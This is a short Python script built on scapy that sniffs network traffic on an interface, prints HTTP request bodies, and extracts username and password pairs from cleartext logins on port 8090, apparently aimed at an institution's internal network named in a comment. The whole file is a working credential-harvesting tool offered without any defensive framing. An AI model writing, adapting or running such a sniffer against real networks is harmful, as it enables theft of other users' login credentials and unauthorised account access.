import scapy.all as scapy
from scapy.layers import http
import re

login_credentials = {}
def sniff(interface: str):
    # Filter can be applied for port 8090 for accessing just the login credentials
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Field in the layers are accessed using the dot operator
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)

    # Checks the TCP layer for any raw data, as in the case for the internal network of SJCE
    if packet.haslayer(scapy.TCP):
        if packet[scapy.TCP].dport == 8090:
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                if "username" and "password" in str(load):
                    print("test")
                    username = re.findall(r"username=([^&]+)", str(load))
                    password = re.findall(r"password=([^&]+)", str(load))
                    login_credentials[username[0]] = password[0]
                    print(login_credentials)


sniff("eth0")